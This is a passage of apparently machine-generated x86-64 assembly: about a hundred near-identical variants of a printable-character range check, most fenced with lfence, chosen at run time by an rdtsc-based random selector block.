	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 37
.Lmain_win2_var37:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 38
.Lmain_win2_var38:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 39
.Lmain_win2_var39:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 40
.Lmain_win2_var40:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 41
.Lmain_win2_var41:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 42
.Lmain_win2_var42:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 43
.Lmain_win2_var43:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 44
.Lmain_win2_var44:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 45
.Lmain_win2_var45:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 46
.Lmain_win2_var46:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 47
.Lmain_win2_var47:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 48
.Lmain_win2_var48:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 49
.Lmain_win2_var49:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 50
.Lmain_win2_var50:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 51
.Lmain_win2_var51:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 52
.Lmain_win2_var52:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 53
.Lmain_win2_var53:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 54
.Lmain_win2_var54:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 55
.Lmain_win2_var55:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 56
.Lmain_win2_var56:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 57
.Lmain_win2_var57:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 58
.Lmain_win2_var58:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 59
.Lmain_win2_var59:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 60
.Lmain_win2_var60:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 61
.Lmain_win2_var61:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 62
.Lmain_win2_var62:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 63
.Lmain_win2_var63:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 64
.Lmain_win2_var64:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 65
.Lmain_win2_var65:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 66
.Lmain_win2_var66:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 67
.Lmain_win2_var67:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 68
.Lmain_win2_var68:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 69
.Lmain_win2_var69:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 70
.Lmain_win2_var70:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 71
.Lmain_win2_var71:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 72
.Lmain_win2_var72:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 73
.Lmain_win2_var73:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 74
.Lmain_win2_var74:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 75
.Lmain_win2_var75:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 76
.Lmain_win2_var76:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 77
.Lmain_win2_var77:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 78
.Lmain_win2_var78:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 79
.Lmain_win2_var79:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 80
.Lmain_win2_var80:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 81
.Lmain_win2_var81:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 82
.Lmain_win2_var82:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 83
.Lmain_win2_var83:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 84
.Lmain_win2_var84:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 85
.Lmain_win2_var85:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 86
.Lmain_win2_var86:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 87
.Lmain_win2_var87:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 88
.Lmain_win2_var88:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 89
.Lmain_win2_var89:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 90
.Lmain_win2_var90:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 91
.Lmain_win2_var91:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 92
.Lmain_win2_var92:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 93
.Lmain_win2_var93:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 94
.Lmain_win2_var94:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 95
.Lmain_win2_var95:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 96
.Lmain_win2_var96:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 97
.Lmain_win2_var97:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 98
.Lmain_win2_var98:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 99
.Lmain_win2_var99:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
.Lmain_win2_continue:
	addq	$32, %rsp
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win1_var0
	cmpl	$1, %eax
	je	.Lmain_win1_var1
	cmpl	$2, %eax
	je	.Lmain_win1_var2
	cmpl	$3, %eax
	je	.Lmain_win1_var3
	cmpl	$4, %eax
	je	.Lmain_win1_var4
	cmpl	$5, %eax
	je	.Lmain_win1_var5
	cmpl	$6, %eax
	je	.Lmain_win1_var6
	cmpl	$7, %eax
	je	.Lmain_win1_var7
	cmpl	$8, %eax
	je	.Lmain_win1_var8
	cmpl	$9, %eax
	je	.Lmain_win1_var9
	cmpl	$10, %eax
	je	.Lmain_win1_var10
	cmpl	$11, %eax
	je	.Lmain_win1_var11
	cmpl	$12, %eax
	je	.Lmain_win1_var12
	cmpl	$13, %eax
	je	.Lmain_win1_var13
	cmpl	$14, %eax
	je	.Lmain_win1_var14
	cmpl	$15, %eax
	je	.Lmain_win1_var15
	cmpl	$16, %eax
	je	.Lmain_win1_var16
	cmpl	$17, %eax
	je	.Lmain_win1_var17
	cmpl	$18, %eax
	je	.Lmain_win1_var18
	cmpl	$19, %eax
	je	.Lmain_win1_var19
	cmpl	$20, %eax
	je	.Lmain_win1_var20
	cmpl	$21, %eax
	je	.Lmain_win1_var21
	cmpl	$22, %eax
	je	.Lmain_win1_var22
	cmpl	$23, %eax
	je	.Lmain_win1_var23
	cmpl	$24, %eax
	je	.Lmain_win1_var24
	cmpl	$25, %eax
	je	.Lmain_win1_var25
	cmpl	$26, %eax
	je	.Lmain_win1_var26
	cmpl	$27, %eax
	je	.Lmain_win1_var27
	cmpl	$28, %eax
	je	.Lmain_win1_var28
	cmpl	$29, %eax
	je	.Lmain_win1_var29
	cmpl	$30, %eax
	je	.Lmain_win1_var30
	cmpl	$31, %eax
	je	.Lmain_win1_var31
	cmpl	$32, %eax
	je	.Lmain_win1_var32
	cmpl	$33, %eax
	je	.Lmain_win1_var33
	cmpl	$34, %eax
	je	.Lmain_win1_var34
	cmpl	$35, %eax
	je	.Lmain_win1_var35
	cmpl	$36, %eax
	je	.Lmain_win1_var36
	cmpl	$37, %eax
	je	.Lmain_win1_var37
	cmpl	$38, %eax
	je	.Lmain_win1_var38
	cmpl	$39, %eax
	je	.Lmain_win1_var39
	cmpl	$40, %eax
	je	.Lmain_win1_var40
	cmpl	$41, %eax
	je	.Lmain_win1_var41
	cmpl	$42, %eax
	je	.Lmain_win1_var42
	cmpl	$43, %eax
	je	.Lmain_win1_var43
	cmpl	$44, %eax
	je	.Lmain_win1_var44
	cmpl	$45, %eax
	je	.Lmain_win1_var45
	cmpl	$46, %eax
	je	.Lmain_win1_var46
	cmpl	$47, %eax
	je	.Lmain_win1_var47
	cmpl	$48, %eax
	je	.Lmain_win1_var48
	cmpl	$49, %eax
	je	.Lmain_win1_var49
	cmpl	$50, %eax
	je	.Lmain_win1_var50
	cmpl	$51, %eax
	je	.Lmain_win1_var51
	cmpl	$52, %eax
	je	.Lmain_win1_var52
	cmpl	$53, %eax
	je	.Lmain_win1_var53
	cmpl	$54, %eax
	je	.Lmain_win1_var54
	cmpl	$55, %eax
	je	.Lmain_win1_var55
	cmpl	$56, %eax
	je	.Lmain_win1_var56
	cmpl	$57, %eax
	je	.Lmain_win1_var57
	cmpl	$58, %eax
	je	.Lmain_win1_var58
	cmpl	$59, %eax
	je	.Lmain_win1_var59
	cmpl	$60, %eax
	je	.Lmain_win1_var60
	cmpl	$61, %eax
	je	.Lmain_win1_var61
	cmpl	$62, %eax
	je	.Lmain_win1_var62
	cmpl	$63, %eax
	je	.Lmain_win1_var63
	cmpl	$64, %eax
	je	.Lmain_win1_var64
	cmpl	$65, %eax
	je	.Lmain_win1_var65
	cmpl	$66, %eax
	je	.Lmain_win1_var66
	cmpl	$67, %eax
	je	.Lmain_win1_var67
	cmpl	$68, %eax
	je	.Lmain_win1_var68
	cmpl	$69, %eax
	je	.Lmain_win1_var69
	cmpl	$70, %eax
	je	.Lmain_win1_var70
	cmpl	$71, %eax
	je	.Lmain_win1_var71
	cmpl	$72, %eax
	je	.Lmain_win1_var72
	cmpl	$73, %eax
	je	.Lmain_win1_var73
	cmpl	$74, %eax
	je	.Lmain_win1_var74
	cmpl	$75, %eax
	je	.Lmain_win1_var75
	cmpl	$76, %eax
	je	.Lmain_win1_var76
	cmpl	$77, %eax
	je	.Lmain_win1_var77
	cmpl	$78, %eax
	je	.Lmain_win1_var78
	cmpl	$79, %eax
	je	.Lmain_win1_var79
	cmpl	$80, %eax
	je	.Lmain_win1_var80
	cmpl	$81, %eax
	je	.Lmain_win1_var81
	cmpl	$82, %eax
	je	.Lmain_win1_var82
	cmpl	$83, %eax
	je	.Lmain_win1_var83
	cmpl	$84, %eax
	je	.Lmain_win1_var84
	cmpl	$85, %eax
	je	.Lmain_win1_var85
	cmpl	$86, %eax
	je	.Lmain_win1_var86
	cmpl	$87, %eax
	je	.Lmain_win1_var87
	cmpl	$88, %eax
	je	.Lmain_win1_var88
	cmpl	$89, %eax
	je	.Lmain_win1_var89
	cmpl	$90, %eax
	je	.Lmain_win1_var90
	cmpl	$91, %eax
	je	.Lmain_win1_var91
	cmpl	$92, %eax
	je	.Lmain_win1_var92
	cmpl	$93, %eax
	je	.Lmain_win1_var93
	cmpl	$94, %eax
	je	.Lmain_win1_var94
	cmpl	$95, %eax
	je	.Lmain_win1_var95
	cmpl	$96, %eax
	je	.Lmain_win1_var96
	cmpl	$97, %eax
	je	.Lmain_win1_var97
	cmpl	$98, %eax
	je	.Lmain_win1_var98
	cmpl	$99, %eax
	je	.Lmain_win1_var99
	jmp	.Lmain_win1_var0
## Variant 0
.Lmain_win1_var0:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 1
.Lmain_win1_var1:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 2
.Lmain_win1_var2:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 3
.Lmain_win1_var3:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 4
.Lmain_win1_var4:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 5
.Lmain_win1_var5:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 6
.Lmain_win1_var6:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 7
.Lmain_win1_var7:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 8
.Lmain_win1_var8:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 9
.Lmain_win1_var9:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 10
.Lmain_win1_var10:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 11
.Lmain_win1_var11:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 12
.Lmain_win1_var12:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 13
.Lmain_win1_var13:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 14
.Lmain_win1_var14:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 15
.Lmain_win1_var15:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 16
.Lmain_win1_var16:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 17
.Lmain_win1_var17:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 18
.Lmain_win1_var18:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 19
.Lmain_win1_var19:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 20
.Lmain_win1_var20:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 21
.Lmain_win1_var21:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 22
.Lmain_win1_var22:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 23
.Lmain_win1_var23:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 24
.Lmain_win1_var24:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 25
.Lmain_win1_var25:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 26
.Lmain_win1_var26:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 27
.Lmain_win1_var27:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 28
.Lmain_win1_var28:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 29
.Lmain_win1_var29:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 30
.Lmain_win1_var30:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 31
.Lmain_win1_var31:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 32
.Lmain_win1_var32:
	popq	%rax
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 33
.Lmain_win1_var33:
	popq	%rax
